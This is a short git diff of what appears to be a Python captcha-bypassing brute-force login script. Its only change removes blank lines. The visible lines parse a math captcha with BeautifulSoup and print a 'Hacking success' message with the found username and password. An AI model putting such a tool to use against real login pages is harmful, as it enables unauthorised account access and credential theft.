@@ -24,7 +24,6 @@ while siker!=1:
       #get the response from bs, just to see it in cool
       soup=BeautifulSoup(response.get_data(), "html.parser")
 
-
       #find the captcha by id (math) and put the string in the variable that will be something like this: <span id="math">10-1=</span>
       kapcsa=str(soup.find("span", {"id": "math"})) 
 
@@ -91,6 +90,3 @@ while siker!=1:
   if siker==1:
     break
 print(f'Hacking success: user: {u}, pwd: {p}')
-  
-  
-  
